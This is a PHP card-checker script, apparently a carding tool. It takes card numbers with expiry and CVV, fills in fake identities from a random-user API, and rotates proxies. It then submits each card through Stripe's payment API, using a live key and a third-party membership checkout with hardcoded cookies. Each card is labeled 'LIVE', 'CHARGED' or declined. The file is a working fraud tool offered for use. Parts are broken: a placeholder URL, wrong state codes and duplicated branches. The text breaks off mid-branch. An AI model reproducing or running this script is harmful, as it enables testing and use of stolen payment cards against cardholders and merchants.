<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

////////////////////////////===[1 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en,ar;q=0.9,en-US;q=0.8,ar-EG;q=0.7,de;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=f8d5c1f5-3e32-4c4f-8ca2-6dd556795b37a933c2&muid=3fa786d7-d554-4601-8d0f-5cde31a31dc473e9ca&sid=d9b52386-c475-41cc-8ba2-c465e2021abaea760a&pasted_fields=number&payment_user_agent=stripe.js%2F7c0f8c373e%3B+stripe-js-v3%2F7c0f8c373e&time_on_page=38652&key=pk_live_GjBRdsM6VbXo2zWhLmR6fSpk00a580WO2c');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'give rdp take api');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: giverdp',
'method: POST',
'path: /membership-account/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en,ar;q=0.9,en-US;q=0.8,ar-EG;q=0.7,de;q=0.6',
'content-type: application/x-www-form-urlencoded',
'cookie: PHPSESSID=c8e0e2087a70aaaded704d64c399be6f; pmpro_visit=1; _ga=GA1.2.1901814729.1678387994; _gid=GA1.2.1923872079.1678387994; __stripe_mid=3fa786d7-d554-4601-8d0f-5cde31a31dc473e9ca; __stripe_sid=d9b52386-c475-41cc-8ba2-c465e2021abaea760a; _gat_gtag_UA_165590754_1=1; _gali=pmpro_submit_span',
'origin: https://scalemyhustle.com',
'referer: https://scalemyhustle.com/membership-account/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
));

////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=1&checkjavascript=1&username=tgwasgwas&bemail=hkrjvkehrhxxd%40eurokool.com&bconfirmemail_copy=1&password=hkrjvkehrhxxd%40eurokool.com&password2=hkrjvkehrhxxd%40eurokool.com&fullname=&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX3173&ExpirationMonth=01&ExpirationYear=2026');

$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));

////////////////////////////===[BIN Info]

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.474011785.1660965643; _gid=GA1.2.110023168.1678388620',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

////////////////////////////===[Responses]

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED  | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>##CHARGED LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card zip code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#CHARGED LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅ Incorrect Zip</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-success'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CVV ✅ Incorrect Zip</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Invalid CVC ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Lost Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Approved CCN ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Stolen Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Lost Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Pickup Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='white'>  <font class='badge badge-info'>#ASTRO LIVE | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Insufficient Funds ✅</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic Decline ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do Not Honor ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>#ASTRO | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase </i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Processing Error ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>CVC Check Unavailable ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined: Missing Card Details ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process: Card Not Checked ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Transaction Not Allowed ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Payment Informations ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Missing Credit Card Number ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Expired ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Declined ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Generic Decline ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Do Not Honor ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Expired Card ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>#ASTRO | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Card Doesnt Support This Purchase </i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Processing Error ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Service Not Allowed ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Declined: Missing Card Details ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Another Request In Process: Card Not Checked ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='white'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-light'>Transaction Not Allowed ❌</i></font><br> <font class='badge badge-primary'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
